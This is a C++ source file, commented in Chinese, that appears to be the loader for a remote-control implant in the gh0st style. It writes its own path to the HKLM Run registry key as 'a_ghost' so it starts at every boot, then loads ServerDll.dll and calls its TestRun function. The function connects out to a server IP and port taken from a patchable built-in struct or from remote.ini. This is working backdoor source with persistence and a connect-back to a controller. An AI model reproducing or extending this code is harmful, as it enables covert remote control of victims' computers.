#include <windows.h>
#include <stdio.h>
#include <iostream>

typedef void (*StopRun)();

typedef bool (*IsStoped)();

// 停止程序运行
StopRun stop = NULL;

// 是否成功停止
IsStoped bStop = NULL;

struct CONNECT_ADDRESS
{
	DWORD dwFlag;
	char  szServerIP[MAX_PATH];
	int   iPort;
}g_ConnectAddress={0x1234567,"",0};

/** 
* @brief 设置本身开机自启动
* @param[in] *sPath 注册表的路径
* @param[in] *sNmae 注册表项名称
* @return 返回注册结果
* @details Win7 64位机器上测试结果表明，注册项在：\n
* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
* @note 首次运行需要以管理员权限运行，才能向注册表写入开机启动项
*/
BOOL SetSelfStart(const char *sPath, const char *sNmae)
{
	// 写入的注册表路径
#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"

	// 在注册表中写入启动信息
	HKEY hKey = NULL;
	LONG lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);

	// 判断是否成功
	if(lRet != ERROR_SUCCESS)
		return FALSE;

	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);

	// 关闭注册表
	RegCloseKey(hKey);

	// 判断是否成功
	return lRet == ERROR_SUCCESS;
}

int main(int argc, const char *argv[])
{
	if(!SetSelfStart(argv[0], "a_ghost"))
	{
		std::cout<<"设置开机自启动失败.\n";
	}
	char path[_MAX_PATH], *p = path;
	GetModuleFileNameA(NULL, path, sizeof(path));
	while (*p) ++p;
	while ('\\' != *p) --p;
	strcpy(p+1, "ServerDll.dll");
	HMODULE hDll = LoadLibraryA(path);
	typedef void (*TestRun)(char* strHost,int nPort);
	TestRun run = hDll ? TestRun(GetProcAddress(hDll, "TestRun")) : NULL;
	stop = hDll ? StopRun(GetProcAddress(hDll, "StopRun")) : NULL;
	bStop = hDll ? IsStoped(GetProcAddress(hDll, "IsStoped")) : NULL;
	if (run)
	{
		char *ip = g_ConnectAddress.szServerIP;
		int &port = g_ConnectAddress.iPort;
		if (0 == strlen(ip))
		{
			strcpy(p+1, "remote.ini");
			GetPrivateProfileStringA("remote", "ip", "127.0.0.1", ip, _MAX_PATH, path);
			port = GetPrivateProfileIntA("remote", "port", 2356, path);
		}
		printf("[remote] %s:%d\n", ip, port);
		run(ip, port);
#ifdef _DEBUG
		while(1){ char ch[64]; std::cin>>ch; if (ch[0]=='q'){ break; } }
		if (stop) stop();
		while(bStop && !bStop()) Sleep(200);
#endif
	}
	return -1;
}
